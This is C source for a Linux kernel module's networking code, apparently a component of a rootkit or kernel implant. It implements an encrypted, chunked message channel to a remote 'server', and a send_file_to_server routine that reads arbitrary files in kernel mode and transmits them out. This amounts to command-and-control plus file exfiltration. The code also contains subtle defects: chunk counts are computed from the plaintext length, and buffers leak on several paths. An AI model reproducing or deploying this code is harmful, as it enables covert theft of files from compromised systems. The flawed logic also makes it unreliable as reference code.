#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/socket.h>

#include "network.h"

/**
 * @brief Sends a message to the server.
 *
 * This function is responsible for transmitting a given message
 * to a predefined server. The server details and connection
 * mechanism are assumed to be handled elsewhere in the code.
 *
 * @param message A pointer to a null-terminated string containing
 *                the message to be sent. The caller must ensure
 *                that the message is properly formatted and
 *                allocated.
 *
 * @return The return value typically indicates the success or
 *         failure of the operation. Specific return codes and
 *         their meanings should be documented in the implementation.
 */
int send_to_server(char *message, ...) {
    va_list args;
    va_list args_copy;
    char *formatted_message;
    int needed;
    int ret_code;

    if (!get_worker_socket()) {
        ERR_MSG("send_to_server: socket is not initialized\n");
        return -EINVAL;
    }

    // Compute required size
    va_start(args, message);
    va_copy(args_copy, args);
    needed = vsnprintf(NULL, 0, message, args);
    va_end(args);

    if (needed < 0) {
        va_end(args_copy);
        return -EIO;
    }

    formatted_message = kzalloc(needed + 1, GFP_KERNEL); // +1 for null terminator
    if (!formatted_message) {
        va_end(args_copy);
        return -ENOMEM;
    }

    // Format the string
    vsnprintf(formatted_message, needed + 1, message, args_copy);
    va_end(args_copy);

    // Send the formatted message
    ret_code = send_to_server_raw(formatted_message, strlen(formatted_message));
    kfree(formatted_message);

    return ret_code;
}

int send_to_server_raw(const char *data, size_t len) {
    // Send data using socket
    // data is sent using chunks of size STD_BUFFER_SIZE bytes
    // a chunk is sent using the following protocol :
    // - first byte: number of chunks that are going to be sent to send the full message data
    // - second byte: index of this chunk
    // - third + fourth byte : lenght of this chunk (max = STD_BUFFER_SIZE - 5)
    // - fifth to last excluded byte: chunk data
    // - last byte:  x04 == End Of Transmission

    // Encrypt the message
    char *encrypted_msg = NULL;
    size_t encrypted_len;
    if (encrypt_buffer(data, len, &encrypted_msg, &encrypted_len) < 0) {
        ERR_MSG("send_to_server_raw: encryption failed\n");
        return -EIO;
    }

    // max chunk body size
    size_t chunk_size = STD_BUFFER_SIZE;
    size_t max_chunk_body_size = chunk_size - 5;

    // get the number of chunks needed to send the data
    size_t nb_chunks_needed = len / max_chunk_body_size;
    if (len % max_chunk_body_size != 0) {
        nb_chunks_needed++;
    }

    // retrieve the socket
    struct socket *sock = get_worker_socket();
    if (!sock) {
        ERR_MSG("send_to_server_raw: socket is not initialized\n");
        kfree(encrypted_msg);
        return -EINVAL;
    }

    // main loop: send all chunks
    for (size_t i = 0; i < nb_chunks_needed; i++) {
        // Allocate the chunk buffer
        char *chunk_buffer = kzalloc(chunk_size, GFP_KERNEL);
        if (!chunk_buffer) {
            ERR_MSG("send_to_server_raw: failed to allocate buffer\n");
            return -ENOMEM;
        }

        // Calculate the actual chunk size for this iteration
        size_t current_chunk_size = (i == nb_chunks_needed - 1) ? (encrypted_len % max_chunk_body_size) : max_chunk_body_size;
        if (current_chunk_size == 0)
            current_chunk_size = max_chunk_body_size; // If the last chunk is full size

        // Fill the chunk buffer
        chunk_buffer[0] = (uint8_t)nb_chunks_needed;                                             // number of chunks
        chunk_buffer[1] = (uint8_t)i;                                                            // index of this chunk
        chunk_buffer[2] = (current_chunk_size >> 8) & 0xFF;                                      // high byte of chunk data length
        chunk_buffer[3] = current_chunk_size & 0xFF;                                             // low byte of chunk data length
        memcpy(chunk_buffer + 4, encrypted_msg + (i * max_chunk_body_size), current_chunk_size); // chunk data
        chunk_buffer[4 + current_chunk_size] = 0x04;                                             // End Of Transmission

        // Send the chunk
        struct kvec vec;
        struct msghdr msg = { 0 };
        vec.iov_base = chunk_buffer;
        vec.iov_len = chunk_size;

        int ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
        if (ret < 0) {
            ERR_MSG("send_to_server_raw: failed to send message (chunk %zu)\n", i);
            kfree(chunk_buffer);
            return -FAILURE;
        }

        kfree(chunk_buffer);
    }

    return SUCCESS;
}

int receive_from_server(char *buffer, size_t max_len) {
    char *received_buffer = kzalloc(max_len, GFP_KERNEL);
    size_t total_received = 0;
    size_t nb_chunks_needed = 0;
    bool *received_chunks = NULL;
    char *chunk_buffer = NULL;

    // Retrieve the socket
    struct socket *sock = get_worker_socket();
    if (!sock) {
        ERR_MSG("receive_from_server: socket is not initialized\n");
        kfree(received_buffer);
        return -EINVAL;
    }

    // This loop waits for and receives the chunks of the message
    while (total_received < max_len) {
        // Allocate a buffer to receive a chunk (maximum size STD_BUFFER_SIZE)
        chunk_buffer = kzalloc(STD_BUFFER_SIZE, GFP_KERNEL);
        if (!chunk_buffer) {
            ERR_MSG("receive_from_server_raw: failed to allocate chunk buffer\n");
            return -ENOMEM;
        }

        struct kvec vec;
        struct msghdr msg = { 0 };
        vec.iov_base = chunk_buffer;
        vec.iov_len = STD_BUFFER_SIZE;

        int ret = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
        if (ret <= 0) {
            ERR_MSG("receive_from_server_raw: failed to receive message (ret=%d)\n", ret);
            kfree(chunk_buffer);
            return -EIO;
        }

        // Extract information from the chunk
        uint8_t total_chunks = chunk_buffer[0];                             // total number of chunks
        uint8_t chunk_index = chunk_buffer[1];                              // index of the current chunk
        uint16_t chunk_data_len = (chunk_buffer[2] << 8) | chunk_buffer[3]; // length of the chunk's data
        uint8_t *chunk_data = (uint8_t *)(chunk_buffer + 4);                // chunk data

        // Verify that the chunk has the correct end of transmission (0x04)
        if (chunk_buffer[4 + chunk_data_len] != 0x04) {
            ERR_MSG("receive_from_server_raw: invalid end of transmission (chunk %d)\n", chunk_index);
            kfree(chunk_buffer);
            return -EINVAL;
        }

        // If this is the first time receiving a message, initialize the received chunks array
        if (nb_chunks_needed == 0) {
            nb_chunks_needed = total_chunks;
            received_chunks = kzalloc(nb_chunks_needed * sizeof(bool), GFP_KERNEL);
            if (!received_chunks) {
                ERR_MSG("receive_from_server_raw: failed to allocate received_chunks array\n");
                kfree(chunk_buffer);
                return -ENOMEM;
            }
        }

        // Check that this chunk has not already been received
        if (received_chunks[chunk_index]) {
            ERR_MSG("receive_from_server_raw: duplicate chunk received (chunk %d)\n", chunk_index);
            kfree(chunk_buffer);
            return -EIO;
        }

        // Mark this chunk as received
        received_chunks[chunk_index] = true;

        // Copy the chunk's data into received_buffer
        if (total_received + chunk_data_len > max_len) {
            ERR_MSG("receive_from_server_raw: received data exceeds buffer size\n");
            kfree(chunk_buffer);
            kfree(received_chunks);
            return -ENOMEM;
        }

        memcpy(received_buffer + total_received, chunk_data, chunk_data_len);
        total_received += chunk_data_len;

        // If all chunks have been received, we can finish receiving
        bool all_received = true;
        for (size_t i = 0; i < nb_chunks_needed; i++) {
            if (!received_chunks[i]) {
                all_received = false;
                break;
            }
        }

        if (all_received) {
            // All chunks have been received, we can finish
            break;
        }

        kfree(chunk_buffer);
    }

    // Free the memory allocated for the received chunks array
    if (chunk_buffer)
        kfree(chunk_buffer);
    kfree(received_chunks);

    // decrypt the received message
    char *decrypted_buffer = NULL;
    size_t decrypted_len;
    if (decrypt_buffer(received_buffer, total_received, &decrypted_buffer, &decrypted_len) < 0) {
        ERR_MSG("receive_from_server_raw: decryption failed\n");
        kfree(received_buffer);
        return -EIO;
    }
    if (decrypted_len >= max_len) {
        decrypted_len = max_len - 1; // Prevent buffer overflow
    }
    memcpy(buffer, decrypted_buffer, decrypted_len);
    buffer[decrypted_len] = '\0';

    kfree(decrypted_buffer);
    kfree(received_buffer);

    return total_received;
}

int send_file_to_server(char *filename) {
    struct file *file = NULL;
    char *buffer = NULL;
    loff_t file_size, pos = 0;
    int ret_code = 0;

    // Allocate buffer for chunks
    buffer = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    if (!buffer)
        return -ENOMEM;
    memset(buffer, 0, STD_BUFFER_SIZE);

    // Open the file
    file = filp_open(filename, O_RDONLY, 0);
    if (IS_ERR(file)) {
        ERR_MSG("send_file_to_server: failed to open file %s\n", filename);
        return -ENOENT;
    }

    // Get file size
    file_size = i_size_read(file_inode(file));
    if (file_size <= 0) {
        ERR_MSG("send_file_to_server: invalid file size for %s\n", filename);
        filp_close(file, NULL);
        return -EINVAL;
    }

    // Allocate buffer for the entire file
    buffer = kzalloc(file_size, GFP_KERNEL);
    if (!buffer) {
        ERR_MSG("send_file_to_server: failed to allocate buffer\n");
        filp_close(file, NULL);
        return -ENOMEM;
    }

    // Read the entire file into the buffer
    if (kernel_read(file, buffer, file_size, &pos) != file_size) {
        ERR_MSG("send_file_to_server: error reading file %s\n", filename);
        ret_code = -EIO;
        goto out;
    }

    DBG_MSG("send_file_to_server: sending file %s\n", filename);

    // Send the entire file in one go
    ret_code = send_to_server_raw(buffer, file_size);
    if (ret_code < 0) {
        ERR_MSG("send_file_to_server: failed to send file: %d\n", ret_code);
        goto out;
    }

    DBG_MSG("send_file_to_server: file sent successfully\n");
    ret_code = SUCCESS;

out:
    filp_close(file, NULL);
    kfree(buffer);
    return ret_code;
}